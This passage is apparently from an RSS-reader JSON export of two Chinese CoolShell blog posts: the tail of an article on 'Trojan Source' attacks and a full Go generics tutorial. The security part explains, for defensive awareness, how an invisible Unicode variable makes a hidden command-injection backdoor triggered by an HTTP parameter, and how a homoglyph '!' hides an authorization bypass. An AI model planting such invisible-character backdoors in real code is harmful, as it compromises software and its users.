字符，如果你使用VSCode，把编码从 Unicode 改成 DOS (CP437) 后你就可以看到这个Unicode了</p>\n<p><img decoding=\"async\" loading=\"lazy\" class=\"aligncenter size-large wp-image-21656\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-1024x923.jpg\" alt=\"\" width=\"640\" height=\"577\" srcset=\"https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-1024x923.jpg 1024w, https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-300x270.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-768x692.jpg 768w, https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-299x270.jpg 299w, https://coolshell.cn/wp-content/uploads/2021/11/1637310735683.jpg 1118w\" sizes=\"(max-width: 640px) 100vw, 640px\" /></p>\n<p>于是，一个你看不见的 <code>πàñ</code> 变量就这样生成了，你再仔细看一下整个逻辑，这个看不见的变量，可以让你的代码执行他想要的命令。因为，http 的请求中有第二个参数，这个参数可奖在后面被执行。于是我们可以构造如下的的 HTTP 请求：</p>\n<p style=\"text-align: center;\"><strong>http://host:port/network_health?%E3%85%A4=&lt;any command&gt;</strong></p>\n<p>其中的，%E3%85%A4 就是 <code>\\u3164</code> 这个不可见Unicode 的编码，于是，一个后门代码就这样在神不知鬼不觉的情况下注入了。</p>\n<p>另外，还可以使用“同形字符”，看看下面这个示例：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"c\">if(environmentǃ=ENV_PROD){\n    // bypass authZ checks in DEV\n    return true;\n}</pre>\n<p>如何你以为 <code>ǃ</code> 是 惊叹号，其实不是，它是一个Unicode <code>╟â</code>。这种东西就算你把你的源码转成 DOS(CP437) 也没用，因为用肉眼在一大堆正常的字符中找不正常的，我觉得是基本不可能的事。</p>\n<p>现在，是时候检查一下你的代码有没有上述的这些情况了……</p>\n<p>（全文完）</p>\n<p>&nbsp;</p>\n<p>&nbsp;<!--\n\n\n\n<p align=\"center\"><a href= target=_blank><img decoding=\"async\" src=\"\"></a></p>\n\n\n\n\n\n<p align=\"center\"><img decoding=\"async\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img decoding=\"async\" loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br />关注CoolShell微信公众账号和微信小程序</p>\n\n \n\n--></p>\n<div style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n\n<div class=\"wp_rp_wrap  wp_rp_vertical_m\" ><div class=\"wp_rp_content\"><h3 class=\"related_post_title\">相关文章</h3><ul class=\"related_post wp_rp\"><li ><a href=\"https://coolshell.cn/articles/3684.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2011/02/1128-150x150.jpg\" alt=\"Web开发人员速查卡\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/3684.html\" class=\"wp_rp_title\">Web开发人员速查卡</a></li><li ><a href=\"https://coolshell.cn/articles/2439.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/16.jpg\" alt=\"黑客的价值观\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/2439.html\" class=\"wp_rp_title\">黑客的价值观</a></li><li ><a href=\"https://coolshell.cn/articles/1957.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/9.jpg\" alt=\"Web程序的最佳测试数据\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/1957.html\" class=\"wp_rp_title\">Web程序的最佳测试数据</a></li><li ><a href=\"https://coolshell.cn/articles/1331.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/11.jpg\" alt=\"Unicode字符预览表\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/1331.html\" class=\"wp_rp_title\">Unicode字符预览表</a></li><li ><a href=\"https://coolshell.cn/articles/5701.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg\" alt=\"SteveY对Amazon和Google平台的吐槽\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/5701.html\" class=\"wp_rp_title\">SteveY对Amazon和Google平台的吐槽</a></li><li ><a href=\"https://coolshell.cn/articles/3512.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/27.jpg\" alt=\"64位平台C/C++开发注意事项\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/3512.html\" class=\"wp_rp_title\">64位平台C/C++开发注意事项</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21649.html\">源代码特洛伊木马攻击</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "category": "网络安全",
          "link": "https://coolshell.cn/articles/21649.html",
          "creator": "陈皓",
          "pubDate": "Fri, 19 Nov 2021 09:02:46 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "zh",
          "folder": "rip",
          "feed": "coolshell",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "b0a1400231d4d3aae6ca970f5cb4cfb5",
          "highlights": []
        },
        {
          "title": "Go编程模式 ： 泛型编程",
          "description": "<p>Go语言的1.17版本发布了，其中开始正式支持泛型了。虽然还有一些限制（比如，不能把泛型函数export），但是，可以体验了。我的这个《Go编程模式》的系列终于...</p>\n<p class=\"read-more\"><a class=\"btn btn-default\" href=\"https://coolshell.cn/articles/21615.html\"> Read More<span class=\"screen-reader-text\">  Read More</span></a></p>\nThe post <a href=\"https://coolshell.cn/articles/21615.html\">Go编程模式 ： 泛型编程</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "content": "<p><script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\"\n     crossorigin=\"anonymous\"></script><img decoding=\"async\" loading=\"lazy\" class=\"alignright wp-image-21627 \" src=\"https://coolshell.cn/wp-content/uploads/2021/09/go-generics-1024x512.png\" alt=\"\" width=\"406\" height=\"203\" srcset=\"https://coolshell.cn/wp-content/uploads/2021/09/go-generics-1024x512.png 1024w, https://coolshell.cn/wp-content/uploads/2021/09/go-generics-300x150.png 300w, https://coolshell.cn/wp-content/uploads/2021/09/go-generics-768x384.png 768w, https://coolshell.cn/wp-content/uploads/2021/09/go-generics-540x270.png 540w, https://coolshell.cn/wp-content/uploads/2021/09/go-generics.png 1200w\" sizes=\"(max-width: 406px) 100vw, 406px\" />Go语言的1.17版本发布了，其中开始正式支持泛型了。虽然还有一些限制（比如，不能把泛型函数export），但是，可以体验了。我的这个《Go编程模式》的系列终于有了真正的泛型编程了，再也不需要使用反射或是go generation这些难用的技术了。周末的时候，我把Go 1.17下载下来，然后，体验了一下泛型编程，还是很不错的。下面，就让我们来看一下Go的泛型编程。（注：不过，如果你对泛型编程的重要性还不是很了解的话，你可以先看一下之前的这篇文章《<a title=\"Go 编程模式：Go Generation\" href=\"https://coolshell.cn/articles/21179.html\" target=\"_blank\" rel=\"noopener\">Go编程模式：Go Generation</a>》，然后再读一下《<a title=\"Go编程模式：Map-Reduce\" href=\"https://coolshell.cn/articles/21164.html\" target=\"_blank\" rel=\"noopener\">Go编程模式：MapReduce</a>》）</p>\n<section class=\"post-series\"><h3 class=\"post-series-title\">本文是全系列中第10 / 10篇：<a href=\"https://coolshell.cn/articles/series/go%e7%bc%96%e7%a8%8b%e6%a8%a1%e5%bc%8f\">Go编程模式</a></h3><ul class=\"post-series-list\"><li class=\"post-series-item\"><span class=\"post-series-item-title\"><a href=\"https://coolshell.cn/articles/21128.html\">Go编程模式：切片，接口，时间和性能</a></span></li><li class=\"post-series-item\"><span class=\"post-series-item-title\"><a href=\"https://coolshell.cn/articles/21140.html\">Go 编程模式：错误处理</a></span></li><li class=\"post-series-item\"><span class=\"post-series-item-title\"><a href=\"https://coolshell.cn/articles/21146.html\">Go 编程模式：Functional Options</a></span></li><li class=\"post-series-item\"><span class=\"post-series-item-title\"><a href=\"https://coolshell.cn/articles/21214.html\">Go编程模式：委托和反转控制</a></span></li><li class=\"post-series-item\"><span class=\"post-series-item-title\"><a href=\"https://coolshell.cn/articles/21164.html\">Go编程模式：Map-Reduce</a></span></li><li class=\"post-series-item\"><span class=\"post-series-item-title\"><a href=\"https://coolshell.cn/articles/21179.html\">Go 编程模式：Go Generation</a></span></li><li class=\"post-series-item\"><span class=\"post-series-item-title\"><a href=\"https://coolshell.cn/articles/17929.html\">Go编程模式：修饰器</a></span></li><li class=\"post-series-item\"><span class=\"post-series-item-title\"><a href=\"https://coolshell.cn/articles/21228.html\">Go编程模式：Pipeline</a></span></li><li class=\"post-series-item\"><span class=\"post-series-item-title\"><a href=\"https://coolshell.cn/articles/21263.html\">Go 编程模式：k8s Visitor 模式</a></span></li><li class=\"post-series-item-current post-series-item\"><span class=\"post-series-item-title\">Go编程模式 ： 泛型编程</span></li></ul><nav class=\"post-series-nav\"><span class=\"post-series-nav-prev\">&laquo; <a href=\"https://coolshell.cn/articles/21263.html\" rel=\"prev\" title=\"Go 编程模式：k8s Visitor 模式\">上一篇文章</a></span></nav></section>\n<h4>初探</h4>\n<p>我们先来看一个简单的示例：</p>\n<p><span id=\"more-21615\"></span></p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">package main\n\nimport \"fmt\"\n\nfunc print[T any] (arr []T) {\n  for _, v := range arr {\n    fmt.Print(v)\n    fmt.Print(\" \")\n  }\n  fmt.Println(\"\")\n}\n\nfunc main() {\n  strs := []string{\"Hello\", \"World\",  \"Generics\"}\n  decs := []float64{3.14, 1.14, 1.618, 2.718 }\n  nums := []int{2,4,6,8}\n\n  print(strs)\n  print(decs)\n  print(nums)\n}</pre>\n<p>上面这个例子中，有一个 <code>print()</code> 函数，这个函数就是想输出数组的值，如果没有泛型的话，这个函数需要写出 <code>int</code> 版，<code>float</code>版，<code>string</code> 版，以及我们的自定义类型（<code>struct</code>）的版本。现在好了，有了泛型的支持后，我们可以使用 <code>[T any]</code> 这样的方式来声明一个泛型类型（有点像C++的 <code>typename T</code>），然后面都使用 <code>T</code> 来声明变量就好。</p>\n<p>上面这个示例中，我们泛型的 <code>print()</code> 支持了三种类型的适配—— <code>int</code>型，<code>float64</code>型，和 <code>string</code>型。要让这段程序跑起来需要在编译行上加上 <code>-gcflags=-G=3</code>编译参数（这个编译参数会在1.18版上成为默认参数），如下所示：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"shell\">$ go run -gcflags=-G=3 ./main.go</pre>\n<p>有了个操作以后，我们就可以写一些标准的算法了，比如，一个查找的算法</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">func find[T comparable] (arr []T, elem T) int {\n  for i, v := range arr {\n    if  v == elem {\n      return i\n    }\n  }\n  return -1\n}</pre>\n<p>我们注意到，我们没有使用 <code>[T any]</code>的形式，而是使用 <code>[T comparable]</code>的形式，<code>comparable</code>是一个接口类型，其约束了我们的类型需要支持 <code>==</code> 的操作， 不然就会有类型不对的编译错误。上面的这个 <code>find()</code> 函数同样可以使用于 <code>int</code>, <code>float64</code>或是<code>string</code>类型。</p>\n<p>从上面的这两个小程序来看，Go语言的泛型已基本可用了，只不过，还有三个问题：</p>\n<ul>\n<li>一个是 <code>fmt.Printf()</code>中的泛型类型是 <code>%v</code> 还不够好，不能像c++ <code>iostream</code>重载 <code>&gt;&gt;</code> 来获得程序自定义的输出。</li>\n<li>另外一个是，go不支持操作符重载，所以，你也很难在泛型算法中使用“泛型操作符”如：<code>==</code> 等</li>\n<li>最后一个是，上面的 <code>find()</code> 算法依赖于“数组”，对于hash-table、tree、graph、link等数据结构还要重写。也就是说，没有一个像C++ STL那样的一个泛型迭代器（这其中的一部分工作当然也需要通过重载操作符（如：<code>++</code> 来实现）</li>\n</ul>\n<p>不过，这个已经很好了，让我们来看一下，可以干哪些事了。</p>\n<h4>数据结构</h4>\n<h5>Stack 栈</h5>\n<p>编程支持泛型最大的优势就是可以实现类型无关的数据结构了。下面，我们用Slices这个结构体来实现一个Stack的数结构。</p>\n<p>首先，我们可以定义一个泛型的Stack</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">type stack [T any] []T</pre>\n<p>看上去很简单，还是 <code>[T any]</code> ，然后 <code>[]T</code> 就是一个数组，接下来就是实现这个数据结构的各种方法了。下面的代码实现了 <code>push()</code> ，<code>pop()</code>，<code>top()</code>，<code>len()</code>，<code>print()</code>这几个方法，这几个方法和 C++的STL中的 Stack很类似。（注：目前Go的泛型函数不支持 export，所以只能使用第一个字符是小写的函数名）</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">func (s *stack[T]) push(elem T) {\n  *s = append(*s, elem)\n}\n\nfunc (s *stack[T]) pop() {\n  if len(*s) &gt; 0 {\n    *s = (*s)[:len(*s)-1]\n  } \n}\nfunc (s *stack[T]) top() *T{\n  if len(*s) &gt; 0 {\n    return &amp;(*s)[len(*s)-1]\n  } \n  return nil\n}\n\nfunc (s *stack[T]) len() int{\n  return len(*s)\n}\n\nfunc (s *stack[T]) print() {\n  for _, elem := range *s {\n    fmt.Print(elem)\n    fmt.Print(\" \")\n  }\n  fmt.Println(\"\")\n}</pre>\n<p>上面的这个例子还是比较简单的，不过在实现的过程中，对于一个如果栈为空，那么 <code>top()</code>要么返回<code>error</code>要么返回空值，在这个地方卡了一下。因为，之前，我们返回的“空”值，要么是 int 的<code>0</code>，要么是 string 的 <code>“”</code>，然而在泛型的<code>T</code>下，这个值就不容易搞了。也就是说，除了类型泛型后，还需要有一些“值的泛型”（注：在C++中，如果你要用一个空栈进行 <code>top()</code> 操作，你会得到一个 segmentation fault），所以，这里我们返回的是一个指针，这样可以判断一下指针是否为空。</p>\n<p>下面是如何使用这个stack的代码。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">func main() {\n\n  ss := stack[string]{}\n  ss.push(\"Hello\")\n  ss.push(\"Hao\")\n  ss.push(\"Chen\")\n  ss.print()\n  fmt.Printf(\"stack top is - %v\\n\", *(ss.top()))\n  ss.pop()\n  ss.pop()\n  ss.print()\n\n  \n  ns := stack[int]{}\n  ns.push(10)\n  ns.push(20)\n  ns.print()\n  ns.pop()\n  ns.print()\n  *ns.top() += 1\n  ns.print()\n  ns.pop()\n  fmt.Printf(\"stack top is - %v\\n\", ns.top())\n\n}</pre>\n<p>&nbsp;</p>\n<h5>LinkList 双向链表</h5>\n<p>下面我们再来看一个双向链表的实现。下面这个实现中实现了 这几个方法：</p>\n<ul>\n<li><code>add()</code> &#8211; 从头插入一个数据结点</li>\n<li><code>push()</code> &#8211; 从尾插入一个数据结点</li>\n<li><code>del()</code> &#8211; 删除一个结点（因为需要比较，所以使用了 <code>compareable</code> 的泛型）</li>\n<li><code>print()</code> &#8211; 从头遍历一个链表，并输出值。</li>\n</ul>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">type node[T comparable] struct {\n  data T\n  prev *node[T]\n  next *node[T]\n}\n\ntype list[T comparable] struct {\n  head, tail *node[T]\n  len int\n}\n\nfunc (l *list[T]) isEmpty() bool {\n  return l.head == nil &amp;&amp; l.tail == nil\n}\n\nfunc (l *list[T]) add(data T) {\n  n := &amp;node[T] {\n    data : data,\n    prev : nil,\n    next : l.head,\n  }\n  if l.isEmpty() {\n    l.head = n\n    l.tail = n\n  }\n  l.head.prev = n\n  l.head = n\n}\n\nfunc (l *list[T]) push(data T) { \n  n := &amp;node[T] {\n    data : data,\n    prev : l.tail,\n    next : nil,\n  }\n  if l.isEmpty() {\n    l.head = n\n    l.tail = n\n  }\n  l.tail.next = n\n  l.tail = n\n}\n\nfunc (l *list[T]) del(data T) { \n  for p := l.head; p != nil; p = p.next {\n    if data == p.data {\n      \n      if p == l.head {\n        l.head = p.next\n      }\n      if p == l.tail {\n        l.tail = p.prev\n      }\n      if p.prev != nil {\n        p.prev.next = p.next\n      }\n      if p.next != nil {\n        p.next.prev = p.prev\n      }\n      return \n    }\n  } \n}\n\nfunc (l *list[T]) print() {\n  if l.isEmpty() {\n    fmt.Println(\"the link list is empty.\")\n    return \n  }\n  for p := l.head; p != nil; p = p.next {\n    fmt.Printf(\"[%v] -&gt; \", p.data)\n  }\n  fmt.Println(\"nil\")\n}</pre>\n<p>上面这个代码都是一些比较常规的链表操作，学过链表数据结构的同学应该都不陌生，使用的代码也不难，如下所示，都很简单，看代码就好了。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">func main(){\n  var l = list[int]{}\n  l.add(1)\n  l.add(2)\n  l.push(3)\n  l.push(4)\n  l.add(5)\n  l.print() //[5] -&gt; [2] -&gt; [1] -&gt; [3] -&gt; [4] -&gt; nil\n  l.del(5)\n  l.del(1)\n  l.del(4)\n  l.print() //[2] -&gt; [3] -&gt; nil\n  \n}</pre>\n<h4>函数式范型</h4>\n<p>接下来，我们就要来看一下我们函数式编程的三大件 <code>map()</code> 、 <code>reduce()</code> 和 <code>filter()</code> 在之前的《<a title=\"Go编程模式：Map-Reduce\" href=\"https://coolshell.cn/articles/21164.html\" target=\"_blank\" rel=\"noopener\">Go编程模式：Map-Reduce</a>》文章中，我们可以看到要实现这样的泛型，需要用到反射，代码复杂到完全读不懂。下面来看一下真正的泛型版本。</p>\n<h5>泛型Map</h5>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">func gMap[T1 any, T2 any] (arr []T1, f func(T1) T2) []T2 {\n  result := make([]T2, len(arr))\n  for i, elem := range arr {\n    result[i] = f(elem)\n  }\n  return result\n}</pre>\n<p>在上面的这个 map函数中我使用了两个类型 &#8211; <code>T1</code> 和 <code>T2</code> ，</p>\n<ul>\n<li><code>T1</code> &#8211; 是需要处理数据的类型</li>\n<li><code>T2</code> &#8211; 是处理后的数据类型</li>\n</ul>\n<p><code>T1</code> 和 <code>T2</code> 可以一样，也可以不一样。</p>\n<p>我们还有一个函数参数 &#8211;  <code>func(T1) T2</code> 意味着，进入的是 <code>T1</code> 类型的，出来的是 <code>T2</code> 类型的。</p>\n<p>然后，整个函数返回的是一个 <code>[]T2</code></p>\n<p>好的，我们来看一下怎么使用这个map函数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">nums := []int {0,1,2,3,4,5,6,7,8,9}\nsquares := gMap(nums, func (elem int) int {\n  return elem * elem\n})\nprint(squares)  //0 1 4 9 16 25 36 49 64 81 \n\nstrs := []string{\"Hao\", \"Chen\", \"MegaEase\"}\nupstrs := gMap(strs, func(s string) string  {\n  return strings.ToUpper(s)\n})\nprint(upstrs) // HAO CHEN MEGAEASE \n\n\ndict := []string{\"零\", \"壹\", \"贰\", \"叁\", \"肆\", \"伍\", \"陆\", \"柒\", \"捌\", \"玖\"}\nstrs =  gMap(nums, func (elem int) string  {\n  return  dict[elem]\n})\nprint(strs) // 零 壹 贰 叁 肆 伍 陆 柒 捌 玖</pre>\n<h5>泛型 Reduce</h5>\n<p>接下来，我们再来看一下我们的Reduce函数，reduce函数是把一堆数据合成一个。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">func gReduce[T1 any, T2 any] (arr []T1, init T2, f func(T2, T1) T2) T2 {\n  result := init\n  for _, elem := range arr {\n    result = f(result, elem)\n  }\n  return result\n}</pre>\n<p>函数实现起来很简单，但是感觉不是很优雅。</p>\n<ul>\n<li>也是有两个类型 <code>T1</code> 和 <code>T2</code>，前者是输出数据的类型，后者是佃出数据的类型。</li>\n<li>因为要合成一个数据，所以需要有这个数据的初始值 <code>init</code>，是 <code>T2</code> 类型</li>\n<li>而自定义函数 <code>func(T2, T1) T2</code>，会把这个init值传给用户，然后用户处理完后再返回出来。</li>\n</ul>\n<p>下面是一个使用上的示例——求一个数组的和</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">nums := []int {0,1,2,3,4,5,6,7,8,9}\nsum := gReduce(nums, 0, func (result, elem int) int  {\n    return result + elem\n})\nfmt.Printf(\"Sum = %d \\n\", sum)</pre>\n<h5>泛型 filter</h5>\n<p>filter函数主要是用来做过滤的，把数据中一些符合条件（filter in）或是不符合条件（filter out）的数据过滤出来，下面是相关的代码示例</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">func gFilter[T any] (arr []T, in bool, f func(T) bool) []T {\n  result := []T{}\n  for _, elem := range arr {\n    choose := f(elem)\n    if (in &amp;&amp; choose) || (!in &amp;&amp; !choose) {\n      result = append(result, elem)\n    }\n  }\n  return result\n}\n\nfunc gFilterIn[T any] (arr []T, f func(T) bool) []T {\n  return gFilter(arr, true, f)\n}\n\nfunc gFilterOut[T any] (arr []T, f func(T) bool) []T {\n  return gFilter(arr, false, f)\n}</pre>\n<p>其中，用户需要提从一个 <code>bool</code> 的函数，我们会把数据传给用户，然后用户只需要告诉我行还是不行，于是我们就会返回一个过滤好的数组给用户。</p>\n<p>比如，我们想把数组中所有的奇数过滤出来</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">nums := []int {0,1,2,3,4,5,6,7,8,9}\nodds := gFilterIn(nums, func (elem int) bool  {\n    return elem % 2 == 1\n})\nprint(odds)</pre>\n<h4>业务示例</h4>\n<p>正如《<a title=\"Go编程模式：Map-Reduce\" href=\"https://coolshell.cn/articles/21164.html\" target=\"_blank\" rel=\"noopener\">Go编程模式：Map-Reduce</a>》中的那个业务示例，我们在这里再做一遍。</p>\n<p>首先，我们先声明一个员工对象和相关的数据</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">type Employee struct {\n  Name     string\n  Age      int\n  Vacation int\n  Salary   float32\n}\n\nvar employees = []Employee{\n  {\"Hao\", 44, 0, 8000.5},\n  {\"Bob\", 34, 10, 5000.5},\n  {\"Alice\", 23, 5, 9000.0},\n  {\"Jack\", 26, 0, 4000.0},\n  {\"Tom\", 48, 9, 7500.75},\n  {\"Marry\", 29, 0, 6000.0},\n  {\"Mike\", 32, 8, 4000.3},\n}</pre>\n<p>然后，我们想统一下所有员工的薪水，我们就可以使用前面的reduce函数</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">total_pay := gReduce(employees, 0.0, func(result float32, e Employee) float32 {\n  return result + e.Salary\n})\nfmt.Printf(\"Total Salary: %0.2f\\n\", total_pay) // Total Salary: 43502.05</pre>\n<p>我们函数这个 <code>gReduce</code> 函数有点啰嗦，还需要传一个初始值，在用户自己的函数中，还要关心 <code>result</code> 我们还是来定义一个更好的版本。</p>\n<p>一般来说，我们用 reduce 函数大多时候基本上是统计求和或是数个数，所以，是不是我们可以定义的更为直接一些？比如下面的这个 <code>CountIf()</code>，就比上面的 Reduce 干净了很多。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">func gCountIf[T any](arr []T, f func(T) bool) int {\n  cnt := 0\n  for _, elem := range arr {\n    if f(elem) {\n      cnt += 1\n    }\n  }\n  return cnt;\n}</pre>\n<p>我们做求和，我们也可以写一个Sum的泛型。</p>\n<ul>\n<li>处理 <code>T</code> 类型的数据，返回 <code>U</code>类型的结果</li>\n<li>然后，用户只需要给我一个需要统计的 <code>T</code> 的 <code>U</code> 类型的数据就可以了。</li>\n</ul>\n<p>代码如下所示：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">type Sumable interface {\n  type int, int8, int16, int32, int64,\n        uint, uint8, uint16, uint32, uint64,\n        float32, float64\n}\n\nfunc gSum[T any, U Sumable](arr []T, f func(T) U) U {\n  var sum U\n  for _, elem := range arr {\n    sum += f(elem)\n  }\n  return sum\n}</pre>\n<p>上面的代码我们动用了一个叫 Sumable 的接口，其限定了 U 类型，只能是 Sumable里的那些类型，也就是整型或浮点型，这个支持可以让我们的泛型代码更健壮一些。</p>\n<p>于是，我们就可以完成下面的事了。</p>\n<p><strong>1）统计年龄大于40岁的员工数</strong></p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">old := gCountIf(employees, func (e Employee) bool  {\n    return e.Age &gt; 40\n})\nfmt.Printf(\"old people(&gt;40): %d\\n\", old) \n// ld people(&gt;40): 2</pre>\n<p><strong>2）统计薪水超过 6000元的员工数</strong></p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">high_pay := gCountIf(employees, func(e Employee) bool {\n  return e.Salary &gt;= 6000\n})\nfmt.Printf(\"High Salary people(&gt;6k): %d\\n\", high_pay) \n//High Salary people(&gt;6k): 4</pre>\n<p><strong>3）统计年龄小于30岁的员工的薪水</strong></p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">younger_pay := gSum(employees, func(e Employee) float32 {\n  if e.Age &lt; 30 {\n      return e.Salary\n  } \n  return 0\n})\nfmt.Printf(\"Total Salary of Young People: %0.2f\\n\", younger_pay)\n//Total Salary of Young People: 19000.00</pre>\n<p><strong>4）统计全员的休假天数</strong></p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">total_vacation := gSum(employees, func(e Employee) int {\n  return e.Vacation\n})\nfmt.Printf(\"Total Vacation: %d day(s)\\n\", total_vacation)\n//Total Vacation: 32 day(s)</pre>\n<p><strong>5）把没有休假的员工过滤出来</strong></p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"golang\">no_vacation := gFilterIn(employees, func(e Employee) bool {\n  return e.Vacation == 0\n})\nprint(no_vacation)\n//{Hao 44 0 8000.5} {Jack 26 0 4000} {Marry 29 0 6000}</pre>\n<p>怎么样，你大概了解了泛型编程的意义了吧。</p>\n<p>（全文完）<!--\n\n\n\n<p align=\"center\"><a href= target=_blank><img decoding=\"async\" src=\"\"></a></p>\n\n\n\n\n\n<p align=\"center\"><img decoding=\"async\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img decoding=\"async\" loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br />关注CoolShell微信公众账号和微信小程序</p>\n\n \n\n--></p>\n<div style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n\n<div class=\"wp_rp_wrap  wp_rp_vertical_m\" ><div class=\"wp_rp_content\"><h3 class=\"related_post_title\">相关文章</h3><ul class=\"related_post wp_rp\"><li ><a href=\"https://coolshell.cn/articles/21164.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.map_.reduce-150x150.png\" alt=\"Go编程模式：Map-Reduce\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/21164.html\" class=\"wp_rp_title\">Go编程模式：Map-Reduce</a></li><li ><a href=\"https://coolshell.cn/articles/21263.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.k8s-150x150.png\" alt=\"Go 编程模式：k8s Visitor 模式\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/21263.html\" class=\"wp_rp_title\">Go 编程模式：k8s Visitor 模式</a></li><li ><a href=\"https://coolshell.cn/articles/21228.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.line_.-150x150.png\" alt=\"Go编程模式：Pipeline\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/21228.html\" class=\"wp_rp_title\">Go编程模式：Pipeline</a></li><li ><a href=\"https://coolshell.cn/articles/21214.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.pair_-150x150.png\" alt=\"Go编程模式：委托和反转控制\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/21214.html\" class=\"wp_rp_title\">Go编程模式：委托和反转控制</a></li><li ><a href=\"https://coolshell.cn/articles/21179.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.generate-150x150.png\" alt=\"Go 编程模式：Go Generation\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/21179.html\" class=\"wp_rp_title\">Go 编程模式：Go Generation</a></li><li ><a href=\"https://coolshell.cn/articles/21146.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.options-150x150.png\" alt=\"Go 编程模式：Functional Options\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/21146.html\" class=\"wp_rp_title\">Go 编程模式：Functional Options</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21615.html\">Go编程模式 ： 泛型编程</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "category": "Go 语言",
          "link": "https://coolshell.cn/articles/21615.html",
          "creator": "陈皓",
          "pubDate": "Sat, 04 Sep 2021 05:44:02 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "zh",
          "folder": "rip",
          "feed": "coolshell",
          "read": false,
          "favorite": false,
